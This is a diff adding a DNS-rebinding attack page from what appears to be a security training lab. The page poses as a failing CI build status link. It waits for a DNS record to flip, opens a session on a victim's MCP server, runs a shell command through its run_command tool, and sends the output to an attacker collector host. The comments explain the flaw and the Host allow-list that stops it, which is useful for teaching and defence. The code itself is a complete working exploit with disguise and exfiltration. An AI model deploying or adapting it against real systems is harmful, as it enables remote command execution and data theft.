@@ -1,0 +1,97 @@
+<!doctype html>
+<!--
+  rebind.html - the DNS-rebinding drive-by page (Meridian Range · MODULE 02 · CVE-2025-66414 class).
+
+  ⛔ LAB-ONLY. Served by the ATTACKER-side deployment (deploy/02-dns-rebind/attacker.yml) on an
+     isolated lab LAN; the victim runs deploy/02-dns-rebind/victim.yml on a SEPARATE VM. This is the
+     REAL, time-varying rebind: you serve this page from rebind.lab.consulereit.nl while that name resolves
+     to the ATTACKER VM, then the operator flips the (external) Technitium record (short TTL) so the SAME
+     name (same host, same port) resolves to the VICTIM VM's MCP. See docs/dns-rebind.md.
+
+  WHY THIS DEFEATS MODULE 01's FIX. Module 01 (CORS) is stopped by validating Origin. Here the page always
+  talks to its OWN origin (rebind.lab.consulereit.nl:PORT) - so every request is SAME-ORIGIN and carries NO
+  cross-origin Origin header. The CORS rule (ATR-2026-70001) stays silent. What is still anomalous is the
+  Host: it names the rebind domain, not a known-good service name. The victim's TypeScript MCP SDK ships
+  DNS-rebind protection OFF by default, so it answers anyway. A Host allow-list is the control that holds.
+
+  SUCCESS IS THE POST-REBIND HIT ON THE VICTIM, NOT LOADING THIS PAGE. The page polls /mcp on its own
+  origin; while the name still points at the attacker it gets nothing. Once the record flips to the victim,
+  the same-origin initialize reaches the victim MCP, a session is issued, run_command echoes the benign
+  canary, and the output is beaconed to the attacker collector. Benign canary only (`id; hostname; echo
+  LAB_CANARY`); nothing leaves the isolated lab LAN.
+
+  Targets:
+    - The MCP endpoint is ALWAYS same-origin (/mcp), so it follows the rebind automatically.
+    - The collector is attacker-controlled and cross-origin; pass it as ?collector=... (its permissive CORS
+      accepts the beacon). Default: http://collector.lab.consulereit.nl:9000/pwned .
+-->
+<meta charset="utf-8" />
+<title>Meridian CI · build #4209</title>
+<style>
+  body { font: 14px/1.5 system-ui, sans-serif; max-width: 720px; margin: 40px auto; color: #1c2530; padding: 0 16px; }
+  .hdr { color: #b00020; font-weight: 600; }
+  .card { border: 1px solid #e3e8ee; border-radius: 8px; padding: 16px 20px; }
+  code { background: #f5f7fa; padding: 1px 5px; border-radius: 4px; }
+  #log { margin-top: 20px; padding: 14px 16px; background: #0d1117; color: #c9d1d9; border-radius: 8px;
+         white-space: pre-wrap; font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; min-height: 40px; }
+  .tag { font-size: 12px; color: #6a737d; }
+</style>
+<div class="card">
+  <p class="hdr">✗ nightly-e2e · build #4209 failed</p>
+  <p><b>main</b> @ <code>b90aa11</code> - e2e: checkout → pay flow timed out after 30000ms.</p>
+  <p>42 passed · 1 failing. This is a shared status link; keep this tab open while it re-checks.</p>
+</div>
+<p class="tag">meridian-range · module 02 (DNS rebinding). Transcript below waits for the record to flip, then drives the victim.</p>
+<pre id="log"></pre>
+<script>
+  // The MCP endpoint is ALWAYS same-origin, so it follows the DNS rebind with no code change. The victim
+  // (ts-vuln) speaks streamable-HTTP: POST /mcp initialize -> session id in the mcp-session-id header.
+  const params = new URLSearchParams(location.search);
+  const MCP = location.origin + "/mcp";                                  // same-origin: follows the rebind
+  const COLLECTOR = params.get("collector") ?? "http://collector.lab.consulereit.nl:9000/pwned";
+  const CANARY = "id; hostname; echo LAB_CANARY_$$";                     // benign proof-of-exec only
+  const POLL_MS = 1000;
+  const log = (m) => (document.getElementById("log").textContent += m + "\n");
+
+  let done = false;
+
+  async function rpc(body, sid) {
+    const headers = { "content-type": "application/json", accept: "application/json, text/event-stream" };
+    if (sid) headers["mcp-session-id"] = sid;
+    // Same-origin fetch: no cross-origin Origin is sent, so the CORS rule cannot see this.
+    const res = await fetch(MCP, { method: "POST", headers, body: JSON.stringify(body) });
+    const text = await res.text();
+    let json = null;
+    try { json = JSON.parse(text.split("\n").filter((l) => l.startsWith("data:")).pop()?.slice(5).trim() ?? text); } catch {}
+    return { status: res.status, sid: res.headers.get("mcp-session-id"), json };
+  }
+
+  async function tryOnce() {
+    if (done) return;
+    let init;
+    try {
+      init = await rpc({ jsonrpc: "2.0", id: 1, method: "initialize",
+        params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "rebind-page", version: "0.0.0" } } });
+    } catch {
+      // still pointing at the attacker host (name not flipped yet); keep waiting.
+      return;
+    }
+    const sid = init.sid;
+    if (!sid) return;                                                   // no session yet - not the victim yet
+    done = true;
+    log("rebind flipped: reached the VICTIM MCP (session " + sid + ")");
+    // drive the capability tool over the post-rebind session.
+    const call = await rpc({ jsonrpc: "2.0", id: 2, method: "tools/call",
+      params: { name: "run_command", arguments: { cmd: CANARY } } }, sid);
+    const out = call.json?.result?.content?.[0]?.text ?? "";
+    log("exec output:\n" + out);
+    // exfil to the attacker collector (cross-origin; its permissive CORS accepts the beacon).
+    fetch(COLLECTOR, { method: "POST", headers: { "content-type": "text/plain" },
+      body: JSON.stringify({ module: "02-dns-rebind", host: location.host, sessionId: sid, output: out }) }).catch(() => {});
+    log("exfiltrated to collector ✓");
+  }
+
+  log("waiting for rebind.lab.consulereit.nl to flip to the victim MCP (polling " + MCP + ") …");
+  const timer = setInterval(() => { if (done) { clearInterval(timer); return; } tryOnce(); }, POLL_MS);
+  tryOnce();
+</script>
